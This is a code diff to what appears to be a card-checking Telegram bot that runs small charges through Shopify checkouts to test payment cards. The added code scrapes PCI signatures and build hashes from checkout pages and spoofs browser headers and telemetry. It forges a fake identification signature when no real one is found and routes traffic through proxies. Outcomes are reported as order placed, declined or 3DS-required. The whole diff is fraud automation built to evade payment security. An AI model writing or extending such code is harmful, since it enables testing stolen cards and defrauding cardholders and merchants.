@@ -593,6 +593,8 @@ class ShopifyHTTPCheckout:
         self.poll_id = "42b5051ef09da17cd5cb5789121ab3adab0ca8c9ec7547a4d431bb17060e757f"
         self.delivery_strategy_handle = None
         self.shopify_payments_identifier = "ca4f484d341716df9c8b4c59632eb0e7"
+        self.pci_signature = None
+        self.pci_build_hash = "a8e4a94"
         
         self.proposal_queue_token = None
         self.payment_method_identifier = None
@@ -730,6 +732,27 @@ class ShopifyHTTPCheckout:
             return None
         except:
             return None
+
+    def extract_pci_data_from_page(self, html_content):
+        """Extract PCI signature and build hash from checkout page"""
+        pci_sig_patterns = [
+            r'"shopifyPaymentRequestIdentificationSignature"\s*:\s*"(eyJ[^"]+)"',
+            r'"identificationSignature"\s*:\s*"(eyJ[^"]+)"',
+            r'"paymentsSignature"\s*:\s*"(eyJ[^"]+)"',
+            r'"signature"\s*:\s*"(eyJ[^"]+)"',
+            r'(eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+)',
+        ]
+        for pat in pci_sig_patterns:
+            m = re.search(pat, html_content)
+            if m:
+                self.pci_signature = m.group(1)
+                self.logger.data_extracted("PCI Signature", self.pci_signature[:40] + "...", "Page HTML")
+                break
+
+        pci_build = re.search(r'checkout\.pci\.shopifyinc\.com/build/([a-f0-9]+)/', html_content)
+        if pci_build:
+            self.pci_build_hash = pci_build.group(1)
+            self.logger.data_extracted("PCI Build Hash", self.pci_build_hash, "Page HTML")
 
     async def add_to_cart_and_get_checkout(self, max_retries=2):
         """Add to cart and get checkout page"""
@@ -912,6 +935,7 @@ class ShopifyHTTPCheckout:
                     self.logger.data_extracted("GraphQL Session Token", self.graphql_session_token, "Constructed")
                     
                     self.extract_dynamic_ids_from_page(page_content)
+                    self.extract_pci_data_from_page(page_content)
                     
                     if not self.delivery_strategy_handle:
                         self.delivery_strategy_handle = self.extract_delivery_strategy(page_content)
@@ -1363,10 +1387,10 @@ class ShopifyHTTPCheckout:
 
                 await self.random_delay(1, 2)
 
-                # ============ PCI STEP - WITH TELEMETRY ============
+                # ============ PCI STEP ============
                 self.step(6, "CREATE PAYMENT", "Creating payment session with PCI and proxy")
 
-                # FIX: Send vaultCard telemetry BEFORE PCI session
+                # Send vaultCard telemetry BEFORE PCI session
                 try:
                     telemetry_url = "https://us-central1-shopify-instrumentat-ff788286.cloudfunctions.net/telemetry"
                     telemetry_body = {
@@ -1404,13 +1428,16 @@ class ShopifyHTTPCheckout:
 
                 await self.random_delay(0.5, 1)
 
+                # Use real PCI signature if available, otherwise generate fake one
+                pci_sig = self.pci_signature if self.pci_signature else f'eyJraWQiOiJ2MSIsImFsZyI6IkhTMjU2In0.{self.generate_random_string(100)}.{self.generate_random_string(43)}'
+                
                 pci_headers = {
                     'authority': 'checkout.pci.shopifyinc.com',
                     'accept': 'application/json',
                     'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                     'content-type': 'application/json',
                     'origin': 'https://checkout.pci.shopifyinc.com',
-                    'referer': 'https://checkout.pci.shopifyinc.com/build/682c31f/number-ltr.html',
+                    'referer': f'https://checkout.pci.shopifyinc.com/build/{self.pci_build_hash}/number-ltr.html',
                     'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
                     'sec-ch-ua-mobile': '?0',
                     'sec-ch-ua-platform': '"Windows"',
@@ -1418,7 +1445,7 @@ class ShopifyHTTPCheckout:
                     'sec-fetch-mode': 'cors',
                     'sec-fetch-site': 'same-origin',
                     'sec-fetch-storage-access': 'active',
-                    'shopify-identification-signature': f'eyJraWQiOiJ2MSIsImFsZyI6IkhTMjU2In0.{self.generate_random_string(100)}.{self.generate_random_string(43)}',
+                    'shopify-identification-signature': pci_sig,
                     'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36'
                 }
 
@@ -1796,7 +1823,7 @@ class ShopifyHTTPCheckout:
         return False, "PROXY_DEAD - All proxy attempts failed"
 
     async def poll_receipt(self, headers):
-        """Poll for receipt status"""
+        """Poll for receipt status with multiple retries"""
         try:
             graphql_url = f"{self.base_url}/checkouts/internal/graphql/persisted"
 
@@ -1833,26 +1860,21 @@ class ShopifyHTTPCheckout:
                     try:
                         poll_resp = resp.json()
                         
-                        # DEBUG: Log poll response
                         resp_str = json.dumps(poll_resp)[:500]
                         self.logger.data_extracted(f"POLL RESPONSE [{poll_attempt+1}]", resp_str, "DEBUG")
                         
                         receipt_data = poll_resp.get('data', {}).get('receipt', {})
-
                         receipt_type = receipt_data.get('__typename', '')
 
                         if receipt_type == 'FailedReceipt':
                             error_info = receipt_data.get('processingError', {})
                             error_code = error_info.get('code', 'UNKNOWN')
-                            error_msg = error_info.get('messageUntranslated', '')
-                            # Return the REAL error code from Shopify
                             return False, f"DECLINED - {error_code}"
 
                         elif receipt_type == 'ProcessedReceipt':
                             return True, "ORDER_PLACED"
 
                         elif receipt_type == 'ActionRequiredReceipt':
-                            # 3DS required
                             return False, "DECLINED - 3DS_REQUIRED"
 
                         elif receipt_type == 'ProcessingReceipt':
@@ -2052,8 +2074,8 @@ async def handle_shopify_charge(client: Client, message: Message):
                     username,
                     user_data,
                     credits_needed=2,
-                    command_name="sh",
-                    gateway_name="Shopify Charge"
+                    command_name="so",
+                    gateway_name="Shopify Charge 0.60$"
                 )
 
                 if isinstance(result, tuple) and len(result) == 3:
